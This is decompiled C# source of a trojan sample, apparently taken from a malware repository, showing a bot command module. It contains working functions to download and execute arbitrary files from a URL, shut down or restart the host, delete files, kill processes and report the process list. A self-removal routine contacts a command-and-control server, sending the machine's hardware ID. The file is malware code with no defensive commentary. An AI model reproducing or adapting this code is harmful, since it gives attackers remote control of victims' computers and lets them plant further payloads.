// Decompiled with JetBrains decompiler
// Type: network.Commandes
// Assembly: network, Version=1.0.0.6, Culture=neutral, PublicKeyToken=null
// MVID: B0A24E30-B253-4D4D-B01C-24ADDB2ED5EA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00033-msil\Trojan-Ransom.Win32.Blocker.ahhr-2d8467fb99e7020f788639b2a01340f22a0724c95184d9bd912f39130e095d14.exe.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using network.My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace network
{
  [StandardModule]
  internal sealed class Commandes
  {
    internal static void DownloadAndExecute(string link)
    {
      string[] strArray = link.Split('/');
      string str = strArray[checked (strArray.Length - 1)];
      new WebClient().DownloadFile(link, str);
      Interaction.Shell(str, AppWinStyle.NormalFocus);
    }

    internal static void OpenProgram(string path) => Interaction.Shell(path, AppWinStyle.NormalFocus);

    internal static void Shutdown() => Interaction.Shell("shutdown -s");

    internal static void Restart() => Interaction.Shell("shutdown -r");

    internal static void DeleteFile(string path)
    {
      try
      {
        new FileInfo(path).Delete();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    internal static void CloseProcess(string name)
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName(name);
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    internal static void DeleteMe()
    {
      MyProject.Forms.Main.del_reg_run(Application.ProductName);
      WebClient Instance = new WebClient();
      NewLateBinding.LateCall((object) Instance, (System.Type) null, "DownloadString", new object[1]
      {
        Operators.ConcatenateObject((object) "http://boti.astria-serv.com/command.php?a=deleteme&hwid=", MyProject.Forms.Main.Get_HWID())
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      Instance.Dispose();
      ProjectData.EndApp();
    }

    internal static string Get_Process()
    {
      string str = "<fieldset><legend>Process list</legend><div class=\"tableau\"><table>" + "<tr>" + "    <th>PID</th>" + "    <th>Name</th>" + "    <th>Memory</th>" + "    <th>Handles</th>" + "    <th>Threads</th>" + "</tr>";
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        str = str + "<tr>" + "    <td>" + Conversions.ToString(process.Id) + "</td>" + "    <td>" + process.ProcessName.ToString() + ".exe</td>" + "    <td>" + Conversions.ToString((double) process.WorkingSet64 / 1024.0) + " K</td>" + "    <td><center>" + Conversions.ToString(process.HandleCount) + "</center></td>" + "    <td><center>" + Conversions.ToString(process.Threads.Count) + "</center></td>" + "</tr>";
        checked { ++index; }
      }
      return str + "</div></table></fieldset>";
    }
  }
}
